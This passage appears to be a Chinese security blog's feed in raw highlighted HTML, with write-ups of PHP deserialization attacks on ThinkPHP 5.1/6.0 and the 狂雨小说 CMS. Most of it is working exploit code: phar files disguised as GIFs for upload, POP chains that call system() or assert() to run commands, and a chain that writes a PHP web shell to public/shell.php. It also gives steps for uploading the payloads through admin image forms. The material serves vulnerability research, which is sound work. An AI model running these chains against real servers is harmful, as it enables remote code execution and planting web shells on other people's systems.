keyword">namespace</span> <span class="token package">League<span class="token punctuation">\</span>Flysystem<span class="token punctuation">\</span>Cached<span class="token punctuation">\</span>Storage</span><span class="token punctuation">{</span>    <span class="token keyword">use</span> <span class="token package">League<span class="token punctuation">\</span>Flysystem<span class="token punctuation">\</span>Cached<span class="token punctuation">\</span>Storage<span class="token punctuation">\</span>AbstractCache</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name">Adapter</span> <span class="token keyword">extends</span> <span class="token class-name">AbstractCache</span>    <span class="token punctuation">{</span>        <span class="token keyword">protected</span> <span class="token variable">$file</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$adapter</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$adapter</span><span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span> <span class="token operator">=</span> <span class="token string">"./public/shell.php"</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">adapter</span> <span class="token operator">=</span> <span class="token variable">$adapter</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">League<span class="token punctuation">\</span>Flysystem<span class="token punctuation">\</span>Adapter</span><span class="token punctuation">{</span>    <span class="token keyword">class</span> <span class="token class-name">Local</span>     <span class="token punctuation">{</span>        <span class="token keyword">protected</span> <span class="token variable">$writeFlags</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//对应file_put_contents的第三个参数</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span><span class="token punctuation">{</span>    <span class="token variable">$local</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">League<span class="token punctuation">\</span>Flysystem<span class="token punctuation">\</span>Adapter<span class="token punctuation">\</span>Local</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$cache</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">League<span class="token punctuation">\</span>Flysystem<span class="token punctuation">\</span>Cached<span class="token punctuation">\</span>Storage<span class="token punctuation">\</span>Adapter</span><span class="token punctuation">(</span><span class="token variable">$local</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string">"GIF89a"</span><span class="token punctuation">.</span><span class="token string">"&lt;?php __HALT_COMPILER(); ?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//设置stub</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$cache</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//将自定义meta-data存入manifest</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string">"test.txt"</span><span class="token punctuation">,</span> <span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//添加要压缩的文件</span>    <span class="token comment" spellcheck="true">//签名自动计算</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$cache</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>将生成的phar文件修改成gif文件，找一处上传gif图片的点，上传这个pahr文件，在添加商品处：admin/store.StoreProduct/create.html</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/3/5.png" alt="" loading="lazy"></p><p>利用phar协议执行反序列化</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/3/6.png" alt="" loading="lazy"></p><h4 id="狂雨小说cms-phar反序列化"><a href="#狂雨小说cms-phar反序列化" class="headerlink" title="狂雨小说cms phar反序列化"></a><strong>狂雨小说cms phar反序列化</strong></h4><p>狂雨小说cms最新版是基于tp5.1.33开发的，此漏洞在后台触发。在控制器\application\admin\controller\Ranking.php中的delAllFiles方法，dir参数可控</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/3/7.png" alt="" loading="lazy"></p><p>利用tp的pop链生成phar文件，exp如下：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">think</span> <span class="token punctuation">{</span>    <span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">Model</span>    <span class="token punctuation">{</span>        <span class="token keyword">protected</span> <span class="token variable">$append</span><span class="token punctuation">;</span>        <span class="token keyword">private</span> <span class="token variable">$data</span><span class="token punctuation">;</span>        <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">append</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"aaaa"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">[</span><span class="token string">"123456"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">data</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"aaaa"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token keyword">new</span> <span class="token class-name">Request</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">class</span> <span class="token class-name">Request</span>    <span class="token punctuation">{</span>        <span class="token keyword">protected</span> <span class="token variable">$param</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$hook</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$filter</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$config</span><span class="token punctuation">;</span>        <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filter</span> <span class="token operator">=</span> <span class="token string">"assert"</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">config</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"var_ajax"</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">''</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">hook</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"visible"</span><span class="token operator">=</span><span class="token operator">></span><span class="token punctuation">[</span><span class="token variable">$this</span><span class="token punctuation">,</span><span class="token string">"isAjax"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">param</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"phpinfo()"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>process<span class="token punctuation">\</span>pipes</span> <span class="token punctuation">{</span>    <span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>Pivot</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name">Windows</span>    <span class="token punctuation">{</span>        <span class="token keyword">private</span> <span class="token variable">$files</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">files</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">Pivot</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model</span> <span class="token punctuation">{</span>    <span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>Model</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name">Pivot</span> <span class="token keyword">extends</span> <span class="token class-name">Model</span>    <span class="token punctuation">{</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span><span class="token punctuation">{</span>    <span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>process<span class="token punctuation">\</span>pipes<span class="token punctuation">\</span>Windows</span><span class="token punctuation">;</span>    <span class="token variable">$cache</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Windows</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string">"GIF89a"</span><span class="token punctuation">.</span><span class="token string">"&lt;?php __HALT_COMPILER(); ?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//设置stub</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$cache</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//将自定义meta-data存入manifest</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string">"test.txt"</span><span class="token punctuation">,</span> <span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//添加要压缩的文件</span>    <span class="token comment" spellcheck="true">//签名自动计算</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$cache</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>修改后缀为gif，找一处图片上传的点，将phar.gif上传</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/3/8.png" alt="" loading="lazy"></p><p>最后利用phar协议执行gif文件进行反序列攻击。</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/3/9.png" alt="" loading="lazy"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;phar的结构&quot;&gt;&lt;a href=&quot;#phar的结构&quot; class=&quot;headerlink&quot; title=&quot;phar的结构&quot;&gt;&lt;/a&gt;&lt;strong&gt;phar的结构&lt;/strong&gt;&lt;/h4&gt;&lt;ol&gt;
&lt;li&gt;a stub是一个文件标志，格式为 ：&lt;code&gt;xx
      
    
    </summary>
    
    
    
      <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPHP6.0反序列化漏洞分析</title>
    <link href="http://yoursite.com/2020/05/13/ThinkPHP6.0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>http://yoursite.com/2020/05/13/ThinkPHP6.0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
    <published>2020-05-13T09:07:31.000Z</published>
    <updated>2020-05-13T09:11:10.699Z</updated>
    
    <content type="html"><![CDATA[<h4 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a><strong>环境搭建</strong></h4><p>安装tp6.0</p><pre class=" language-shell"><code class="language-shell">composer create-project --prefer-dist topthink/think=6.0.x-dev tp6.0cd tp6.0php think run</code></pre><p>在index控制器中写入</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">app<span class="token punctuation">\</span>controller</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">app<span class="token punctuation">\</span>BaseController</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Index</span> <span class="token keyword">extends</span> <span class="token class-name">BaseController</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a><strong>漏洞分析</strong></h4><p>全局搜索__destruct魔术方法，在\vendor\topthink\think-orm\src\Model.php</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">lazySave</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>$this-&gt;lazySave可控，为true的时候，执行save方法，跟进save方法</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/6666/1.png" alt="" loading="lazy"></p><p>这里要满足两个if语句，$this-&gt;isEmpty()为false，$this-&gt;trigger要不为false，跟进isEmpty方法</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> bool<span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">data</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>$this-&gt;data可控，当存在的时候返回false，继续跟进trigger方法</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/6666/2.png" alt="" loading="lazy"></p><p>$this-&gt;withEvent可控，当为false时，进入teturn语句，满足if语句，继续看下一行代码</p><pre class=" language-php"><code class="language-php"><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">exists</span> <span class="token operator">?</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">updateData</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">insertData</span><span class="token punctuation">(</span><span class="token variable">$sequence</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>$this-&gt;exists可控，为true时，跟进updateData方法</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/6666/3.png" alt="" loading="lazy"></p><p>这里要执行到checkAllowFields方法，需要经过2个if语句，第一个if要满足$this-&gt;trigger不为false</p><pre class=" language-php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token boolean">false</span> <span class="token operator">===</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">trigger</span><span class="token punctuation">(</span><span class="token string">'BeforeUpdate'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>第二个if要满足$data存在，跟进下getChangedData方法</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/6666/4.png" alt="" loading="lazy"></p><p>这里满足$this-&gt;force存在，$this-&gt;data也可控，即2个if语句也绕过了，就可以继续跟进checkAllowFields方法</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/6666/5.png" alt="" loading="lazy"></p><p>这里发现$this-&gt;table和$this-&gt;suffix进行连接操作，即为字符串，可以触发__toString方法，这里就可以利用ThinkPHP5.2.x那条pop链来构造rce，全局进行搜索__toString方法，跟到\vendor\topthink\think-orm\src\model\concern\Conversion.php文件</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">toJson</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>跟进toJson-&gt;toArray方法</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/6666/6.png" alt="" loading="lazy"></p><p>这里需要执行到getAttr方法，需要满足其中一个$data的key和$this-&gt;visible的key相同，既可以触发getAttr方法</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getAttr</span><span class="token punctuation">(</span>string <span class="token variable">$name</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// key = name</span><span class="token punctuation">{</span>    <span class="token keyword">try</span> <span class="token punctuation">{</span>        <span class="token variable">$relation</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token variable">$value</span>    <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getData</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// whoami</span>    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InvalidArgumentException</span> <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$relation</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">isRelationAttr</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$value</span>    <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">,</span> <span class="token variable">$relation</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// fanxing  whoami</span><span class="token punctuation">}</span></code></pre><p>跟进getData方法</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/6666/7.png" alt="" loading="lazy"></p><p>这里$fieldName的键要存在于$this-&gt;data数组中，而$fieldName时通过getRealFieldName获取的</p><pre class=" language-php"><code class="language-php"><span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function">getRealFieldName</span><span class="token punctuation">(</span>string <span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">:</span> string<span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">strict</span> <span class="token operator">?</span> <span class="token variable">$name</span> <span class="token punctuation">:</span> Str<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">snake</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>满足$this-&gt;strict为true就返回传递进来的值。最后又回到getAttr方法中</p><pre class=" language-php"><code class="language-php"><span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">,</span> <span class="token variable">$relation</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>经过上面的分析，这里满足$name和$value可控，跟进getValue方法</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/6666/8.png" alt="" loading="lazy"></p><p>漏洞触发点在圈起的地方，这里value可控，只需要满足$closure可控就可以rce，看上行代码，$this-&gt;withAttr是可控的，$fieldName是经过getRealFieldName方法获得的，也是可控的，最后，整个pop链就分析完了。</p><h4 id="pop链流程"><a href="#pop链流程" class="headerlink" title="pop链流程"></a><strong>pop链流程</strong></h4><p>这里利用下<a href="https://github.com/Mochazz/ThinkPHP-Vuln/blob/master/ThinkPHP6/ThinkPHP6.X%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE.md" target="_blank" rel="noopener">Mochazz</a>的pop链分析图片</p><p><img src="https://raw.githubusercontent.com/Mochazz/ThinkPHP-Vuln/master/ThinkPHP6/ThinkPHP6.X%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE/4.png" alt="" loading="lazy"></p><h4 id="EXP编写"><a href="#EXP编写" class="headerlink" title="EXP编写"></a><strong>EXP编写</strong></h4><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>concern</span><span class="token punctuation">;</span><span class="token keyword">trait</span> <span class="token class-name">Conversion</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token keyword">trait</span> <span class="token class-name">Attribute</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$withAttr</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'fanxing'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'system'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'fanxing'</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">'dir'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">think</span><span class="token punctuation">;</span><span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">Model</span><span class="token punctuation">{</span>    <span class="token keyword">use</span> <span class="token package">model<span class="token punctuation">\</span>concern<span class="token punctuation">\</span>Attribute</span><span class="token punctuation">;</span>    <span class="token keyword">use</span> <span class="token package">model<span class="token punctuation">\</span>concern<span class="token punctuation">\</span>Conversion</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$lazySave</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$exists</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$field</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$schema</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$table</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$suffix</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$visible</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">lazySave</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">exists</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">table</span> <span class="token operator">=</span> <span class="token string">'123'</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">suffix</span> <span class="token operator">=</span> <span class="token variable">$data</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">visible</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'fanxing'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'111'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>Model</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Pivot</span> <span class="token keyword">extends</span> <span class="token class-name">Model</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">parent</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Pivot</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Pivot</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/6666/9.png" alt="" loading="lazy"></p><p>tp6.0反序列还有其他链，复制下<a href="http://hed9eh0g.top/?p=217" target="_blank" rel="noopener">Hed9eh0g</a>这条链写入文件的poc</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token keyword">namespace</span> <span class="token package">League<span class="token punctuation">\</span>Flysystem<span class="token punctuation">\</span>Cached<span class="token punctuation">\</span>Storage</span><span class="token punctuation">{</span>    <span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">AbstractCache</span>    <span class="token punctuation">{</span>        <span class="token keyword">protected</span> <span class="token variable">$autosave</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$cache</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"shell"</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">"&lt;?php phpinfo();?>"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span 